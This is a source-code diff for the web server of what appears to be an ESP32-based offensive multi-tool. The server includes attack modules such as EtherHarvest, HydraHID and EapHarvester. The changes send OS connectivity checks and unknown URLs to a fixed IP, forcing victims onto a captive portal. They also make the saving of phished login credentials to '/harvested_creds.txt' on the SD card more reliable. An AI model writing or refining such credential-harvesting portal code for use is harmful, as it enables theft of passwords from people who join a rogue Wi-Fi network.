@@ -7,6 +7,8 @@
 #include <ArduinoJson.h>
 #include <uptime.h>
 #include <ElegantOTA.h>
+#include <vector>
+#include <string>
 
 #include "../../Devices/TFT/HardwareTFT.h"
 #include "../../Devices/Storage/HardwareStorage.h"
@@ -20,7 +22,6 @@
 #include "../../Attacks/Marauder/Marauder.h"
 #include "../../Attacks/Ducky/DuckyPayload.h"
 #include "../../Attacks/Ghost/SilentSentinel.h"
-#include "../../Attacks/Neo/EtherHarvest.h"
 #include "../../Attacks/Neo/EtherHarvest.h"
 #include "../../Attacks/Trinity/HydraHID.h"
 #include "../../Attacks/Trinity/EapHarvester.h"
@@ -47,6 +48,9 @@ static AsyncWebSocket audio("/audio");
 extern std::unordered_map<const char *, std::pair<const uint8_t *, size_t>> staticHtmlFilesLookup;
 static const char *remoteAddress = "127.0.0.1:7002";
 static Preferences *preferences = nullptr;
+
+static std::vector<std::string> pendingCreds;
+static SemaphoreHandle_t credsMutex = NULL;
 
 static const std::unordered_map<std::string, std::string> mimeTypes = {
     {".html", "text/html"},
@@ -164,11 +168,11 @@ static void webRequestHandler(AsyncWebServerRequest *request)
 
   if (url == "/wpad.dat")
   {
-    request->send(404);
+    request->redirect("http://4.3.2.1/");
   }
   else if (url == "/connecttest.txt")
   {
-    request->send(404);
+    request->redirect("http://4.3.2.1/");
   }
   else if (url == "/data.json")
   {
@@ -234,7 +238,6 @@ static void webRequestHandler(AsyncWebServerRequest *request)
     capabilities.add("MARAUDER");
 #endif
     root["ghostRunning"] = Attacks::Ghost.isRunning();
-    root["ghostRunning"] = Attacks::Ghost.isRunning();
     root["ghostCaptured"] = Attacks::Ghost.getCapturedCount();
     root["neoRunning"] = Attacks::Neo.isRunning();
     root["neoPoisoned"] = Attacks::Neo.getPoisonedCount();
@@ -257,7 +260,7 @@ static void webRequestHandler(AsyncWebServerRequest *request)
   }
   else if (url == "/generate_204" || url == "/ncsi.txt" || url == "/hotspot-detect.html" || url == "/wpad.dat")
   {
-    request->redirect("/"); // redirect to our main page for captive portal
+    request->redirect("http://4.3.2.1/"); // redirect to absolute IP for captive portal
   }
   else if (url == "/runfile" && request->hasParam("filename"))
   {
@@ -476,9 +479,8 @@ static void webRequestHandler(AsyncWebServerRequest *request)
     }
     else
     {
-      // Serial.println("sending 404");
-      Debug::Log.error(LOG_WEB, std::string("Unknown URL: ") + url.c_str());
-      request->send(404);
+      Debug::Log.error(LOG_WEB, std::string("Unknown URL (Captive Redirect): ") + url.c_str());
+      request->redirect("http://4.3.2.1/");
     }
   }
 }
@@ -553,6 +555,11 @@ void WebSite::begin(Preferences &prefs)
 
   preferences = &prefs;
 
+  if (credsMutex == NULL)
+  {
+    credsMutex = xSemaphoreCreateMutex();
+  }
+
   if (!serverHandlersAdded)
   {
     controlInterfaceWebServer.onFileUpload(handleUpload);
@@ -577,12 +584,11 @@ void WebSite::begin(Preferences &prefs)
         Attacks::Blue::Logger.logCommand("captive_portal_login", logMsg);
 #endif
 
-        // Save to SD
-        if (Devices::Storage.isRunning()) {
-          auto file = Devices::Storage.openFile("/harvested_creds.txt", "a");
-          if (file) {
-            file.println(logMsg.c_str());
-            file.close();
+        // Queue credentials for SD write in loop()
+        if (credsMutex != NULL) {
+          if (xSemaphoreTake(credsMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
+            pendingCreds.push_back(logMsg);
+            xSemaphoreGive(credsMutex);
           }
         }
       }
@@ -643,6 +649,17 @@ void WebSite::loop(Preferences &prefs)
   if (preferences == nullptr)
   {
     return;
+  }
+
+  // Safely write pending credentials to SD
+  if (credsMutex != NULL && xSemaphoreTake(credsMutex, 0) == pdTRUE) {
+    if (!pendingCreds.empty() && Devices::Storage.isRunning()) {
+      for (const auto& cred : pendingCreds) {
+        Devices::Storage.appendToFile("/harvested_creds.txt", cred + "\n");
+      }
+      pendingCreds.clear();
+    }
+    xSemaphoreGive(credsMutex);
   }
 
   ws.cleanupClients();
